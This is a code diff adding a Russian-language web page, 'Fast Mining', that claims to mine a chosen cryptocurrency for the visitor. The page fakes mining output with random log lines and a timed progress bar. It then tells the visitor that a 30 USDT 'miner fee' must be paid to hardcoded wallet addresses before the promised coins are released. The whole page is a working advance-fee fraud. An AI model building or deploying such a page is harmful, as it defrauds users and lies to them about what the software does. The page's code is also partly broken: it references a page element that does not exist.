@@ -1,0 +1,1079 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Crypto Mining - Fast Mining</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #000000;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 500px;
+      width: 100%;
+    }
+
+    .card {
+      background: #1a1a1a;
+      border-radius: 24px;
+      padding: 40px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+      border: 1px solid #333333;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 40px;
+    }
+
+    .header h1 {
+      color: #ffffff;
+      font-size: 32px;
+      margin-bottom: 10px;
+      font-weight: 800;
+    }
+
+    .header p {
+      color: #888888;
+      font-size: 16px;
+    }
+
+    .price-status {
+      display: inline-block;
+      margin-top: 10px;
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 600;
+      background: #1a1a1a;
+      border: 1px solid #333;
+    }
+
+    .price-status.loading {
+      color: #ffaa00;
+      border-color: #ffaa00;
+    }
+
+    .price-status.live {
+      color: #00ff00;
+      border-color: #00ff00;
+      animation: pulse 2s infinite;
+    }
+
+    .price-status.error {
+      color: #ff4444;
+      border-color: #ff4444;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.6; }
+    }
+
+    .screen {
+      display: none;
+    }
+
+    .screen.active {
+      display: block;
+      animation: fadeIn 0.5s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .form-group {
+      margin-bottom: 25px;
+    }
+
+    .form-group label {
+      display: block;
+      color: #ffffff;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 10px;
+    }
+
+    .crypto-select {
+      width: 100%;
+      padding: 16px;
+      background: #000000;
+      border: 2px solid #333333;
+      border-radius: 12px;
+      color: #ffffff;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+
+    .crypto-select:focus {
+      outline: none;
+      border-color: #ffffff;
+      box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.1);
+    }
+
+    .crypto-select option {
+      background: #1a1a1a;
+      color: #ffffff;
+      padding: 10px;
+    }
+
+    .amount-buttons {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 15px;
+      margin-top: 15px;
+    }
+
+    .amount-btn {
+      padding: 20px;
+      background: #000000;
+      border: 2px solid #333333;
+      border-radius: 12px;
+      color: #ffffff;
+      font-size: 18px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s;
+      text-align: center;
+    }
+
+    .amount-btn:hover {
+      border-color: #ffffff;
+      background: #1a1a1a;
+      transform: translateY(-2px);
+    }
+
+    .amount-btn.selected {
+      border-color: #ffffff;
+      background: #2a2a2a;
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
+    }
+
+    .amount-btn .usd {
+      font-size: 24px;
+      color: #ffffff;
+      margin-bottom: 8px;
+    }
+
+    .amount-btn .crypto {
+      font-size: 20px;
+      color: #ffffff;
+      font-weight: 700;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 16px;
+      background: #000000;
+      border: 2px solid #333333;
+      border-radius: 12px;
+      color: #ffffff;
+      font-size: 18px;
+      transition: all 0.3s;
+    }
+
+    .input-field:focus {
+      outline: none;
+      border-color: #ffffff;
+      box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.1);
+    }
+
+    .input-field::placeholder {
+      color: #555555;
+    }
+
+    .hint {
+      color: #888888;
+      font-size: 13px;
+      margin-top: 8px;
+    }
+
+    .primary-btn {
+      width: 100%;
+      padding: 18px;
+      background: #ffffff;
+      color: #000000;
+      border: none;
+      border-radius: 12px;
+      font-size: 18px;
+      font-weight: 700;
+      margin-top: 10px;
+      cursor: pointer;
+      transition: all 0.3s;
+      box-shadow: 0 4px 15px rgba(255, 255, 255, 0.2);
+    }
+
+    .primary-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(255, 255, 255, 0.3);
+      background: #f0f0f0;
+    }
+
+    .primary-btn:disabled {
+      opacity: 0.3;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .back-btn {
+      width: 100%;
+      padding: 14px;
+      background: transparent;
+      color: #888888;
+      border: 1px solid #333333;
+      border-radius: 12px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+      margin-top: 10px;
+    }
+
+    .back-btn:hover {
+      border-color: #555555;
+      color: #ffffff;
+    }
+
+    .crypto-card {
+      background: #000000;
+      border: 2px solid #333333;
+      border-radius: 16px;
+      padding: 20px;
+      margin-bottom: 15px;
+      cursor: pointer;
+      transition: all 0.3s;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .crypto-card:hover {
+      border-color: #555555;
+      background: #0a0a0a;
+    }
+
+    .crypto-card.selected {
+      border-color: #ffffff;
+      background: #1a1a1a;
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
+    }
+
+    .crypto-info {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+
+    .crypto-icon {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      overflow: hidden;
+      background: #ffffff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .crypto-icon img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .crypto-details h3 {
+      color: #ffffff;
+      font-size: 20px;
+      margin-bottom: 4px;
+      font-weight: 700;
+    }
+
+    .crypto-details p {
+      color: #888888;
+      font-size: 14px;
+    }
+
+    .crypto-price {
+      text-align: right;
+    }
+
+    .crypto-price .price {
+      color: #ffffff;
+      font-size: 18px;
+      font-weight: 700;
+      margin-bottom: 4px;
+    }
+
+    .crypto-price .change {
+      font-size: 14px;
+      font-weight: 600;
+    }
+
+    .crypto-price .change.positive {
+      color: #00ff00;
+    }
+
+    .crypto-price .change.negative {
+      color: #ff4444;
+    }
+
+    .progress-container {
+      margin-top: 30px;
+    }
+
+    .progress-bar-wrapper {
+      background: #000000;
+      border-radius: 12px;
+      height: 12px;
+      overflow: hidden;
+      margin-bottom: 15px;
+    }
+
+    .progress-bar {
+      background: linear-gradient(90deg, #ffffff 0%, #cccccc 100%);
+      height: 100%;
+      width: 0%;
+      transition: width 0.3s;
+      border-radius: 12px;
+    }
+
+    .progress-info {
+      display: flex;
+      justify-content: space-between;
+      color: #888888;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .code-container {
+      background: #000000;
+      border: 1px solid #333333;
+      border-radius: 12px;
+      padding: 20px;
+      height: 300px;
+      overflow-y: auto;
+      font-family: 'Courier New', monospace;
+      font-size: 12px;
+    }
+
+    .code-line {
+      color: #00ff00;
+      margin-bottom: 4px;
+      line-height: 1.6;
+    }
+
+    .result-box {
+      background: #000000;
+      border: 1px solid #333333;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 20px;
+    }
+
+    .result-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 15px;
+      padding-bottom: 15px;
+      border-bottom: 1px solid #333333;
+    }
+
+    .result-row:last-child {
+      border-bottom: none;
+      margin-bottom: 0;
+      padding-bottom: 0;
+    }
+
+    .result-label {
+      color: #888888;
+      font-size: 14px;
+    }
+
+    .result-value {
+      color: #ffffff;
+      font-size: 14px;
+      font-weight: 600;
+      text-align: right;
+      word-break: break-all;
+      max-width: 60%;
+    }
+
+    .warning-box {
+      background: rgba(255, 170, 0, 0.1);
+      border: 1px solid #ffaa00;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 20px;
+    }
+
+    .warning-box h3 {
+      color: #ffaa00;
+      font-size: 16px;
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .warning-box p {
+      color: #cccccc;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    .fee-info {
+      background: #000000;
+      border: 1px solid #333333;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 20px;
+    }
+
+    .fee-amount {
+      color: #ffffff;
+      font-size: 24px;
+      font-weight: 700;
+      margin-bottom: 10px;
+    }
+
+    .fee-description {
+      color: #888888;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    .wallet-display {
+      background: #000000;
+      border: 1px solid #333333;
+      border-radius: 12px;
+      padding: 15px;
+      margin-bottom: 20px;
+      word-break: break-all;
+      color: #ffffff;
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+    }
+
+    ::-webkit-scrollbar {
+      width: 8px;
+    }
+
+    ::-webkit-scrollbar-track {
+      background: #000000;
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: #333333;
+      border-radius: 4px;
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+      background: #555555;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <!-- Welcome Screen -->
+      <div id="welcomeScreen" class="screen active">
+        <div class="header">
+          <h1>⚡ Fast Mining</h1>
+          <p>Быстрый майнинг криптовалюты</p>
+        </div>
+        <button class="primary-btn" onclick="startMining()">Начать майнинг</button>
+      </div>
+
+      <!-- Select Crypto Screen -->
+      <div id="selectCryptoScreen" class="screen">
+        <div class="header">
+          <h1>Выберите криптовалюту</h1>
+          <p>Какую монету вы хотите майнить?</p>
+          <div class="price-status loading" id="priceStatus">🟡 Загрузка курсов...</div>
+        </div>
+
+        <div id="cryptoList">
+          <!-- Crypto cards will be generated here -->
+        </div>
+
+        <button class="primary-btn" id="continueToCryptoBtn" disabled onclick="continueToAmount()">Продолжить</button>
+        <button class="back-btn" onclick="backToWelcome()">Назад</button>
+      </div>
+
+      <!-- Amount Screen -->
+      <div id="amountScreen" class="screen">
+        <div class="header">
+          <h1>Выберите сумму</h1>
+          <p>Сколько вы хотите намайнить?</p>
+        </div>
+
+        <div class="amount-buttons" id="amountButtons">
+          <!-- Amount buttons will be generated here -->
+        </div>
+
+        <button class="primary-btn" id="continueToWalletBtn" disabled onclick="continueToWallet()">Продолжить</button>
+        <button class="back-btn" onclick="backToSelect()">Назад</button>
+      </div>
+
+      <!-- Wallet Screen -->
+      <div id="walletScreen" class="screen">
+        <div class="header">
+          <h1>Введите кошелек</h1>
+          <p>Куда отправить <span id="walletCryptoName">криптовалюту</span>?</p>
+        </div>
+
+        <div class="form-group">
+          <label for="walletInput">Адрес кошелька</label>
+          <input 
+            type="text" 
+            id="walletInput" 
+            class="input-field" 
+            placeholder="Вставьте адрес вашего кошелька"
+            oninput="validateWallet()"
+          >
+          <p class="hint">Введите адрес кошелька <span id="hintCryptoName">BTC</span></p>
+        </div>
+
+        <button class="primary-btn" id="startMiningBtn" disabled onclick="startMiningProcess()">Начать майнинг</button>
+        <button class="back-btn" onclick="backToAmount()">Назад</button>
+      </div>
+
+      <!-- Mining Screen -->
+      <div id="miningScreen" class="screen">
+        <div class="header">
+          <h1>⚡ Идет майнинг...</h1>
+          <p id="statusMessage">Подключение к пулу...</p>
+        </div>
+
+        <div class="progress-container">
+          <div class="progress-bar-wrapper">
+            <div class="progress-bar" id="progressBar"></div>
+          </div>
+          <div class="progress-info">
+            <span>Прогресс</span>
+            <span id="progressText">0%</span>
+          </div>
+        </div>
+
+        <div class="code-container" id="codeDisplay">
+          <!-- Mining code output will appear here -->
+        </div>
+      </div>
+
+      <!-- Success Screen -->
+      <div id="successScreen" class="screen">
+        <div class="header">
+          <h1>✅ Майнинг завершен!</h1>
+          <p>Криптовалюта готова к выводу</p>
+        </div>
+
+        <div class="result-box">
+          <div class="result-row">
+            <span class="result-label">Криптовалюта</span>
+            <span class="result-value" id="resultCrypto">BTC</span>
+          </div>
+          <div class="result-row">
+            <span class="result-label">Сумма</span>
+            <span class="result-value" id="resultAmount">0.001 BTC</span>
+          </div>
+          <div class="result-row">
+            <span class="result-label">Кошелек</span>
+            <span class="result-value" id="resultWallet">bc1q...</span>
+          </div>
+        </div>
+
+        <div class="warning-box">
+          <h3>⚠️ Комиссия за вывод</h3>
+          <p>Для вывода средств необходимо оплатить комиссию майнеров в размере <strong>30 USDT</strong> в <span id="feeCryptoName">BTC</span>. Это стандартная комиссия блокчейна.</p>
+        </div>
+
+        <div class="fee-info">
+          <div class="fee-amount" id="feeAmount">≈ 0.0005 BTC</div>
+          <p class="fee-description">Отправьте комиссию на адрес ниже для завершения транзакции</p>
+        </div>
+
+        <div class="wallet-display" id="paymentWallet">
+          <!-- Payment wallet will be shown here -->
+        </div>
+
+        <button class="primary-btn" onclick="resetForm()">Начать заново</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Хранилище курсов криптовалют
+    var cryptoPrices = {};
+    var priceChanges = {};
+
+    var selectedCrypto = '';
+    var selectedAmountUSD = 0;
+    var selectedAmountCrypto = 0;
+    var selectedWallet = '';
+
+    // Список криптовалют с логотипами
+    var cryptoList = [
+      { 
+        symbol: 'BTC', 
+        name: 'Bitcoin', 
+        logo: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1.png',
+        binanceSymbol: 'BTCUSDT'
+      },
+      { 
+        symbol: 'ETH', 
+        name: 'Ethereum', 
+        logo: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png',
+        binanceSymbol: 'ETHUSDT'
+      },
+      { 
+        symbol: 'BNB', 
+        name: 'BNB', 
+        logo: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png',
+        binanceSymbol: 'BNBUSDT'
+      },
+      { 
+        symbol: 'XRP', 
+        name: 'Ripple', 
+        logo: 'https://s2.coinmarketcap.com/static/img/coins/64x64/52.png',
+        binanceSymbol: 'XRPUSDT'
+      },
+      { 
+        symbol: 'SOL', 
+        name: 'Solana', 
+        logo: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5426.png',
+        binanceSymbol: 'SOLUSDT'
+      },
+      { 
+        symbol: 'ADA', 
+        name: 'Cardano', 
+        logo: 'https://s2.coinmarketcap.com/static/img/coins/64x64/2010.png',
+        binanceSymbol: 'ADAUSDT'
+      },
+      { 
+        symbol: 'DOGE', 
+        name: 'Dogecoin', 
+        logo: 'https://s2.coinmarketcap.com/static/img/coins/64x64/74.png',
+        binanceSymbol: 'DOGEUSDT'
+      }
+    ];
+
+    // Адреса кошельков для разных криптовалют
+    var paymentWallets = {
+      'BTC': 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
+      'ETH': '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb1',
+      'BNB': 'bnb1grpf0955h0ykzq3ar5nmum7y6gdfl6lxfn46h2',
+      'XRP': 'rDsbeomae4FXwgQTJp9Rs64Qg9vDiTCdBv',
+      'SOL': '7UX2i7SucgLMQcfZ75s3VXmZZY4YRUyJN9X1RgfMoDUi',
+      'ADA': 'addr1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
+      'DOGE': 'DH5yaieqoZN36fDVciNyRueRGvGLR3mr7L',
+      'USDT': '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb1'
+    };
+
+    // Загрузка курсов с Binance API
+    async function loadCryptoPrices() {
+      var statusElement = document.getElementById('priceStatus');
+      statusElement.className = 'price-status loading';
+      statusElement.textContent = '🟡 Загрузка курсов...';
+
+      try {
+        // Загружаем 24h данные для всех монет
+        var response = await fetch('https://api.binance.com/api/v3/ticker/24hr');
+        var data = await response.json();
+
+        // Обрабатываем каждую криптовалюту
+        cryptoList.forEach(function(crypto) {
+          var ticker = data.find(function(item) {
+            return item.symbol === crypto.binanceSymbol;
+          });
+
+          if (ticker) {
+            cryptoPrices[crypto.symbol] = parseFloat(ticker.lastPrice);
+            var changePercent = parseFloat(ticker.priceChangePercent);
+            priceChanges[crypto.symbol] = {
+              percent: changePercent.toFixed(2),
+              isPositive: changePercent >= 0
+            };
+          }
+        });
+
+        statusElement.className = 'price-status live';
+        statusElement.textContent = '🟢 Актуальные курсы';
+        console.log('✅ Актуальные курсы загружены:', cryptoPrices);
+        
+        // Обновляем карточки криптовалют
+        generateCryptoList();
+        
+      } catch (error) {
+        console.error('❌ Ошибка загрузки курсов:', error);
+        statusElement.className = 'price-status error';
+        statusElement.textContent = '🔴 Ошибка загрузки';
+        
+        // Используем резервные курсы
+        useFallbackPrices();
+        generateCryptoList();
+      }
+    }
+
+    // Резервные курсы на случай ошибки API
+    function useFallbackPrices() {
+      cryptoPrices = {
+        'BTC': 67234.50,
+        'ETH': 2589.32,
+        'BNB': 589.12,
+        'XRP': 0.5234,
+        'SOL': 142.67,
+        'ADA': 0.3456,
+        'DOGE': 0.1234
+      };
+      
+      priceChanges = {
+        'BTC': { percent: '2.4', isPositive: true },
+        'ETH': { percent: '1.8', isPositive: true },
+        'BNB': { percent: '3.2', isPositive: true },
+        'XRP': { percent: '-0.5', isPositive: false },
+        'SOL': { percent: '5.1', isPositive: true },
+        'ADA': { percent: '1.2', isPositive: true },
+        'DOGE': { percent: '4.3', isPositive: true }
+      };
+    }
+
+    function showScreen(screenId) {
+      document.querySelectorAll('.screen').forEach(function(screen) {
+        screen.classList.remove('active');
+      });
+      document.getElementById(screenId).classList.add('active');
+    }
+
+    function startMining() {
+      loadCryptoPrices();
+      showScreen('selectCryptoScreen');
+    }
+
+    function generateCryptoList() {
+      var container = document.getElementById('cryptoList');
+      container.innerHTML = '';
+
+      cryptoList.forEach(function(crypto) {
+        var price = cryptoPrices[crypto.symbol] || 0;
+        var change = priceChanges[crypto.symbol] || { percent: '0.00', isPositive: true };
+        var changeClass = change.isPositive ? 'positive' : 'negative';
+        var changeSign = change.isPositive ? '+' : '';
+        
+        var card = document.createElement('div');
+        card.className = 'crypto-card';
+        card.onclick = function() { selectCrypto(crypto.symbol, card); };
+        
+        card.innerHTML = 
+          '<div class="crypto-info">' +
+            '<div class="crypto-icon">' +
+              '<img src="' + crypto.logo + '" alt="' + crypto.symbol + '" onerror="this.style.display=\'none\'">' +
+            '</div>' +
+            '<div class="crypto-details">' +
+              '<h3>' + crypto.symbol + '</h3>' +
+              '<p>' + crypto.name + '</p>' +
+            '</div>' +
+          '</div>' +
+          '<div class="crypto-price">' +
+            '<div class="price">$' + price.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2}) + '</div>' +
+            '<div class="change ' + changeClass + '">' + changeSign + change.percent + '%</div>' +
+          '</div>';
+        
+        container.appendChild(card);
+      });
+    }
+
+    function selectCrypto(crypto, cardElement) {
+      document.querySelectorAll('.crypto-card').forEach(function(card) {
+        card.classList.remove('selected');
+      });
+      
+      cardElement.classList.add('selected');
+      selectedCrypto = crypto;
+      document.getElementById('continueToCryptoBtn').disabled = false;
+    }
+
+    function continueToAmount() {
+      if (!selectedCrypto) return;
+      
+      document.getElementById('walletCryptoName').textContent = selectedCrypto;
+      document.getElementById('hintCryptoName').textContent = selectedCrypto;
+      
+      generateAmountButtons();
+      showScreen('amountScreen');
+    }
+
+    function generateAmountButtons() {
+      var amounts = [100, 250, 500, 1000, 2500, 5000];
+      var container = document.getElementById('amountButtons');
+      container.innerHTML = '';
+
+      amounts.forEach(function(amountUSD) {
+        var cryptoAmount = calculateCryptoAmount(amountUSD, selectedCrypto);
+        
+        var button = document.createElement('button');
+        button.className = 'amount-btn';
+        button.onclick = function() { selectAmount(amountUSD, cryptoAmount, button); };
+        
+        button.innerHTML = 
+          '<div class="usd">$' + amountUSD + '</div>' +
+          '<div class="crypto">≈ ' + cryptoAmount + ' ' + selectedCrypto + '</div>';
+        
+        container.appendChild(button);
+      });
+    }
+
+    function calculateCryptoAmount(usdAmount, crypto) {
+      var price = cryptoPrices[crypto] || 1;
+      var cryptoAmount = usdAmount / price;
+      
+      if (cryptoAmount >= 1) {
+        return cryptoAmount.toFixed(4);
+      } else if (cryptoAmount >= 0.01) {
+        return cryptoAmount.toFixed(6);
+      } else {
+        return cryptoAmount.toFixed(8);
+      }
+    }
+
+    function selectAmount(usdAmount, cryptoAmount, buttonElement) {
+      document.querySelectorAll('.amount-btn').forEach(function(btn) {
+        btn.classList.remove('selected');
+      });
+      
+      buttonElement.classList.add('selected');
+      selectedAmountUSD = usdAmount;
+      selectedAmountCrypto = cryptoAmount;
+      document.getElementById('continueToWalletBtn').disabled = false;
+    }
+
+    function continueToWallet() {
+      if (!selectedAmountUSD) return;
+      showScreen('walletScreen');
+    }
+
+    function validateWallet() {
+      var wallet = document.getElementById('walletInput').value.trim();
+      var isValid = wallet.length >= 26;
+      
+      document.getElementById('startMiningBtn').disabled = !isValid;
+      
+      if (isValid) {
+        selectedWallet = wallet;
+      }
+    }
+
+    function startMiningProcess() {
+      if (!selectedWallet) return;
+      
+      showScreen('miningScreen');
+      simulateLoading();
+    }
+
+    function generateRandomMiningCode() {
+      var templates = [
+        '> GPU ' + Math.floor(Math.random() * 8) + ': Hash rate: ' + (Math.random() * 50 + 20).toFixed(2) + ' MH/s',
+        '> Found share! Difficulty: ' + Math.floor(Math.random() * 1000000) + ' | Nonce: ' + Math.floor(Math.random() * 4294967296),
+        '> Block height: ' + Math.floor(Math.random() * 900000 + 700000) + ' | Estimated time: ' + Math.floor(Math.random() * 300) + 's',
+        '> Pool latency: ' + Math.floor(Math.random() * 50) + 'ms | Accepted shares: ' + Math.floor(Math.random() * 1000),
+        '> Temperature: ' + Math.floor(Math.random() * 20 + 60) + '°C | Fan speed: ' + Math.floor(Math.random() * 40 + 60) + '%',
+        '> Power consumption: ' + Math.floor(Math.random() * 100 + 150) + 'W | Efficiency: ' + (Math.random() * 0.3 + 0.4).toFixed(3) + ' J/MH',
+        '> Memory usage: ' + (Math.random() * 2 + 6).toFixed(1) + ' GB | Clock: ' + Math.floor(Math.random() * 500 + 1500) + ' MHz',
+        '> Validating block... Hash: 0x' + Math.random().toString(16).substr(2, 16),
+        '> Network difficulty: ' + (Math.random() * 20 + 30).toFixed(2) + 'T | Your hashrate: ' + (Math.random() * 100).toFixed(2) + ' MH/s',
+        '> [' + '█'.repeat(Math.floor(Math.random() * 20)) + '░'.repeat(20 - Math.floor(Math.random() * 20)) + '] Computing...',
+        '> Checking solution validity... ' + Math.floor(Math.random() * 100) + '% complete',
+        '> Worker ' + Math.floor(Math.random() * 4 + 1) + ' submitted share | Reward: ' + (Math.random() * 0.001).toFixed(8) + ' ' + selectedCrypto
+      ];
+      
+      return templates[Math.floor(Math.random() * templates.length)];
+    }
+
+    function simulateLoading() {
+      var progress = 0;
+      var codeDisplay = document.getElementById('codeDisplay');
+      var progressBar = document.getElementById('progressBar');
+      var progressText = document.getElementById('progressText');
+      var statusMessage = document.getElementById('statusMessage');
+
+      codeDisplay.innerHTML = '';
+
+      var codeLines = [
+        '> Connecting to mining pool...',
+        '> Initializing GPU/CPU resources...',
+        '> Verifying wallet address: ' + selectedWallet.substring(0, 20) + '...',
+        '> Wallet verified successfully',
+        '> Starting mining process...',
+        '> ',
+        '> ============ MINING STARTED ============',
+        '> '
+      ];
+
+      var statusMessages = [
+        'Connecting to mining pool...',
+        'Initializing hardware...',
+        'Verifying wallet address...',
+        'Starting mining...',
+        'Mining in progress...',
+        'Calculating hashes...',
+        'Searching for blocks...',
+        'Verifying solutions...',
+        'Almost there...',
+        'Finalizing...'
+      ];
+
+      var lineIndex = 0;
+      var statusIndex = 0;
+      var miningCodeInterval;
+      var miningStarted = false;
+
+      var interval = setInterval(function() {
+        progress += 100 / 60;
+
+        if (progress <= 100) {
+          progressBar.style.width = progress + '%';
+          progressText.textContent = Math.floor(progress) + '%';
+
+          if (lineIndex < codeLines.length && progress >= (lineIndex + 1) * 3) {
+            var line = document.createElement('div');
+            line.className = 'code-line';
+            line.textContent = codeLines[lineIndex];
+            codeDisplay.appendChild(line);
+            
+            codeDisplay.scrollTop = codeDisplay.scrollHeight;
+            
+            lineIndex++;
+
+            if (lineIndex >= codeLines.length && !miningStarted) {
+              miningStarted = true;
+              
+              miningCodeInterval = setInterval(function() {
+                var randomLine = document.createElement('div');
+                randomLine.className = 'code-line';
+                randomLine.textContent = generateRandomMiningCode();
+                codeDisplay.appendChild(randomLine);
+                
+                codeDisplay.scrollTop = codeDisplay.scrollHeight;
+                
+                var lines = codeDisplay.getElementsByClassName('code-line');
+                if (lines.length > 60) {
+                  codeDisplay.removeChild(lines[0]);
+                }
+              }, 100);
+            }
+          }
+
+          var newStatusIndex = Math.floor(progress / 10);
+          if (newStatusIndex !== statusIndex && newStatusIndex < statusMessages.length) {
+            statusIndex = newStatusIndex;
+            statusMessage.textContent = statusMessages[statusIndex];
+          }
+        }
+
+        if (progress >= 100) {
+          clearInterval(interval);
+          clearInterval(miningCodeInterval);
+          
+          var finalLines = [
+            '> ',
+            '> Block found!',
+            '> Verifying solution...',
+            '> Solution verified!',
+            '> Distributing rewards...',
+            '> Sending ' + selectedAmountCrypto + ' ' + selectedCrypto + ' to wallet...',
+            '> Transaction confirmed!',
+            '> Mining completed successfully!'
+          ];
+          
+          var finalIndex = 0;
+          var finalInterval = setInterval(function() {
+            if (finalIndex < finalLines.length) {
+              var line = document.createElement('div');
+              line.className = 'code-line';
+              line.textContent = finalLines[finalIndex];
+              codeDisplay.appendChild(line);
+              codeDisplay.scrollTop = codeDisplay.scrollHeight;
+              finalIndex++;
+            } else {
+              clearInterval(finalInterval);
+              setTimeout(function() {
+                showSuccess();
+              }, 1000);
+            }
+          }, 300);
+        }
+      }, 1000);
+    }
+
+    function showSuccess() {
+      document.getElementById('resultCrypto').textContent = selectedCrypto;
+      document.getElementById('resultAmount').textContent = selectedAmountCrypto + ' ' + selectedCrypto;
+      document.getElementById('resultWallet').textContent = selectedWallet;
+      
+      var feeInCrypto = calculateCryptoAmount(30, selectedCrypto);
+      document.getElementById('feeCryptoName').textContent = selectedCrypto;
+      document.getElementById('feeAmount').textContent = '≈ ' + feeInCrypto + ' ' + selectedCrypto;
+      document.getElementById('paymentCryptoName').textContent = selectedCrypto;
+      
+      var paymentWallet = paymentWallets[selectedCrypto] || paymentWallets['BTC'];
+      document.getElementById('paymentWallet').textContent = paymentWallet;
+      
+      showScreen('successScreen');
+    }
+
+    function backToSelect() {
+      showScreen('selectCryptoScreen');
+    }
+
+    function backToWelcome() {
+      document.querySelectorAll('.crypto-card').forEach(function(card) {
+        card.classList.remove('selected');
+      });
+      document.getElementById('continueToCryptoBtn').disabled = true;
+      selectedCrypto = '';
+      
+      showScreen('welcomeScreen');
+    }
+
+    function backToAmount() {
+      showScreen('amountScreen');
+    }
+
+    function resetForm() {
+      document.getElementById('walletInput').value = '';
+      document.getElementById('codeDisplay').innerHTML = '';
+      document.getElementById('progressBar').style.width = '0%';
+      
+      document.querySelectorAll('.amount-btn').forEach(function(btn) {
+        btn.classList.remove('selected');
+      });
+      document.querySelectorAll('.crypto-card').forEach(function(card) {
+        card.classList.remove('selected');
+      });
+      
+      selectedCrypto = '';
+      selectedAmountUSD = 0;
+      selectedAmountCrypto = 0;
+      selectedWallet = '';
+      
+      showScreen('welcomeScreen');
+    }
+
+  </script>
+</body>
+</html>
